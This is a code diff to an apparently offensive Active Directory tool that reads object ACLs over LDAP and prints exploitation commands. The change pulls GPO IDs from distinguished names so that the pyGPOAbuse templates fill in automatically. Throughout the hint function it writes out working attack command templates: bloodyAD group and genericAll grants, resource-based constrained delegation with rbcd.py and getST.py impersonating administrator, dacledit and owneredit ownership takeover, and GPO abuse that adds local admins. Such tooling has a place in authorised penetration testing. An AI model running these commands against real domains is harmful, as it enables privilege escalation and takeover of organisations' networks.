@@ -117,9 +117,11 @@ def decode_mask(mask):
 
     return rights
 
-def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, current_auth, dc_fqdn, target_fqdn, is_hash=False):
+def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, current_auth, dc_fqdn, target_fqdn, is_hash=False, gpo_id=None):
     hints = []
     bloody_auth = f":{current_auth}" if is_hash else current_auth
+    if not gpo_id:
+        gpo_id = '<GPO-ID>'
     
     if right == "WriteSPN":
         #hints.append(("Kerberoasting (WriteSPN)", f"impacket-GetUserSPNs {domain}/{current_user} -request -dc-ip {dc_ip} -target-dn '{target}'"))
@@ -144,8 +146,8 @@ def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, 
             hints.append(("Give genericall rights on group", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth} add genericAll {target} {current_user}"))
             hints.append(("Add group itself", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth} add groupMember {target} {current_user}"))
         elif obj_type == "gpo":
-            hints.append(("GPO Abuse - Immediate Scheduled Task", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -f -dc-ip {dc_ip}"))
-            hints.append(("GPO Abuse - Add Local Admin", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -localadmin -dc-ip {dc_ip}"))
+            hints.append(("GPO Abuse - Immediate Scheduled Task", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '{gpo_id}' -f -dc-ip {dc_ip}"))
+            hints.append(("GPO Abuse - Add Local Admin", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '{gpo_id}' -localadmin -dc-ip {dc_ip}"))
             hints.append(("SharpGPOAbuse", f"SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {current_user} --GPOName \"{target}\""))
     elif "Generic Write" in right or "GenericWrite" in right:
         if obj_type == "user":
@@ -157,8 +159,8 @@ def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, 
             hints.append(("RBCD Step 2: Write Delegation", f"rbcd.py -delegate-from 'ATTACKERSYSTEM2$' -delegate-to '{target}' -action 'write' '{domain}/{current_user}:{current_auth}'"))
             hints.append(("RBCD Step 3: Get Service Ticket", f"getST.py -spn 'cifs/{target_fqdn}' -impersonate 'administrator' '{domain}/ATTACKERSYSTEM2$:Summer2019!'"))
         elif obj_type == "gpo":
-            hints.append(("GPO Abuse - Immediate Scheduled Task", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -f -dc-ip {dc_ip}"))
-            hints.append(("GPO Abuse - Add Local Admin", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -localadmin -dc-ip {dc_ip}"))
+            hints.append(("GPO Abuse - Immediate Scheduled Task", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '{gpo_id}' -f -dc-ip {dc_ip}"))
+            hints.append(("GPO Abuse - Add Local Admin", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '{gpo_id}' -localadmin -dc-ip {dc_ip}"))
             hints.append(("SharpGPOAbuse", f"SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {current_user} --GPOName \"{target}\""))
         #elif obj_type == "group":
             #hints.append(("Add Member to Group (GenericWrite)", f"impacket-net group '{target}' {current_user} -add -domain -dc-ip {dc_ip}"))
@@ -188,8 +190,8 @@ def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, 
             hints.append(("Add Member to Group", f"{bloody_base} add groupMember {target} {current_user}"))
         elif obj_type == "gpo":
             hints.append(("WriteDACL on GPO - Grant GenericAll", f"dacledit.py -action 'write' -rights 'FullControl' -principal '{current_user}' -target '{target}' '{domain}/{current_user}:{current_auth}'"))
-            hints.append(("Then GPO Abuse - Scheduled Task", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -f -dc-ip {dc_ip}"))
-            hints.append(("Then GPO Abuse - Add Local Admin", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -localadmin -dc-ip {dc_ip}"))
+            hints.append(("Then GPO Abuse - Scheduled Task", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '{gpo_id}' -f -dc-ip {dc_ip}"))
+            hints.append(("Then GPO Abuse - Add Local Admin", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '{gpo_id}' -localadmin -dc-ip {dc_ip}"))
     elif "Write Owner" in right or "WriteOwner" in right:
         if obj_type == "user":
             hints.append(("Take Ownership (Step 1)", f"owneredit.py -action write -new-owner {current_user} -target {target} '{domain}/{current_user}:{current_auth}'"))
@@ -207,7 +209,7 @@ def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, 
         elif obj_type == "gpo":
             hints.append(("Take Ownership (Step 1)", f"owneredit.py -action write -new-owner {current_user} -target '{target}' '{domain}/{current_user}:{current_auth}'"))
             hints.append(("Grant FullControl (Step 2)", f"dacledit.py -action 'write' -rights 'FullControl' -principal '{current_user}' -target '{target}' '{domain}/{current_user}:{current_auth}'"))
-            hints.append(("GPO Abuse (Step 3)", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '<GPO-ID-from-DN>' -f -dc-ip {dc_ip}"))
+            hints.append(("GPO Abuse (Step 3)", f"python3 pyGPOAbuse.py '{domain}/{current_user}:{bloody_auth}' -gpo-id '{gpo_id}' -f -dc-ip {dc_ip}"))
         else:
             hints.append(("Take Ownership", f"owneredit.py -action write -new-owner {current_user} -target {target} '{domain}/{current_user}:{current_auth}'"))
 
@@ -286,7 +288,7 @@ def main(args=None):
     #principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount))'
     #principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer))'
     #principal_filter = '(|(objectClass=user)(objectClass=group)(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount))'
-    conn.search(base_dn, principal_filter, attributes=['sAMAccountName', 'nTSecurityDescriptor', 'objectClass', 'dNSHostName', 'msDS-GroupMSAMembership', 'displayName', 'gPCFileSysPath'], controls=controls)
+    conn.search(base_dn, principal_filter, attributes=['sAMAccountName', 'nTSecurityDescriptor', 'objectClass', 'dNSHostName', 'msDS-GroupMSAMembership', 'displayName', 'gPCFileSysPath', 'distinguishedName'], controls=controls)
     #if not conn.entries:
         #print(f"[-] Could not find: {target_user}")
         #exit()
@@ -327,10 +329,20 @@ def main(args=None):
         if target_fqdn.endswith('$'):
             target_fqdn = target_fqdn[:-1] + "." + args.domain
 
-
+        # Extract GPO ID from distinguishedName (e.g. CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,...)
+        gpo_id = None
+        if obj_type == "gpo" and hasattr(entry, 'distinguishedName') and str(entry.distinguishedName):
+            dn_str = str(entry.distinguishedName)
+            import re
+            gpo_match = re.search(r'\{([0-9A-Fa-f\-]+)\}', dn_str)
+            if gpo_match:
+                gpo_id = gpo_match.group(1)
 
         # Create a tree for this user
-        user_tree = Tree(f"[bold blue]{args.username}[/bold blue] -> [bold red]{target_name}[/bold red] ([yellow]{obj_type}[/yellow])", guide_style="bold bright_black")
+        if obj_type == "gpo" and gpo_id:
+            user_tree = Tree(f"[bold blue]{args.username}[/bold blue] -> [bold red]{target_name}[/bold red] ([yellow]{obj_type}[/yellow]) [dim]GPO-ID: {gpo_id}[/dim]", guide_style="bold bright_black")
+        else:
+            user_tree = Tree(f"[bold blue]{args.username}[/bold blue] -> [bold red]{target_name}[/bold red] ([yellow]{obj_type}[/yellow])", guide_style="bold bright_black")
 
         # GMSA msDS-GroupMSAMembership check
         if obj_type == "gmsa" and 'msDS-GroupMSAMembership' in entry:
@@ -355,7 +367,7 @@ def main(args=None):
 
                         auth_val = args.hash if args.hash else args.password
                         is_hash = True if args.hash else False
-                        hints = get_exploitation_hint("ReadGmsaPassword", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash)
+                        hints = get_exploitation_hint("ReadGmsaPassword", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash, gpo_id=gpo_id)
                         
                         
                         if hints:
@@ -440,7 +452,7 @@ def main(args=None):
                                 unique_hints = {}
                                 is_hash = True if args.hash else False
                                 for right in rights:
-                                    hints = get_exploitation_hint(right, target_name, obj_type, args.domain, args.dc_ip, args.username, args.hash if args.hash else args.password, dc_fqdn, target_fqdn, is_hash)
+                                    hints = get_exploitation_hint(right, target_name, obj_type, args.domain, args.dc_ip, args.username, args.hash if args.hash else args.password, dc_fqdn, target_fqdn, is_hash, gpo_id=gpo_id)
                                     if hints:
                                         for name, cmd in hints:
                                             unique_hints[(name, cmd)] = None
@@ -481,7 +493,7 @@ def main(args=None):
                 
                                             auth_val = args.hash if args.hash else args.password
                                             is_hash = True if args.hash else False
-                                            hints = get_exploitation_hint("WriteSPN", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash)
+                                            hints = get_exploitation_hint("WriteSPN", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash, gpo_id=gpo_id)
                                             
                                             if hints:
                                                 exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
@@ -518,7 +530,7 @@ def main(args=None):
                 
                                             auth_val = args.hash if args.hash else args.password
                                             is_hash = True if args.hash else False
-                                            hints = get_exploitation_hint("User_Force_Change_Password", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash)
+                                            hints = get_exploitation_hint("User_Force_Change_Password", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash, gpo_id=gpo_id)
                                             
                                             if hints:
                                                 exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
@@ -554,7 +566,7 @@ def main(args=None):
                 
                                             auth_val = args.hash if args.hash else args.password
                                             is_hash = True if args.hash else False
-                                            hints = get_exploitation_hint("AddSelf (Self-Membership)", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash)
+                                            hints = get_exploitation_hint("AddSelf (Self-Membership)", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash, gpo_id=gpo_id)
                                             
                                             if hints:
                                                 exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
@@ -606,7 +618,7 @@ def main(args=None):
                                     unique_hints = {}
                                     is_hash = True if args.hash else False
                                     for r in rights:
-                                        hints = get_exploitation_hint(r, target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash)
+                                        hints = get_exploitation_hint(r, target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash, gpo_id=gpo_id)
                                         if hints:
                                             for name, cmd in hints:
                                                 unique_hints[(name, cmd)] = None
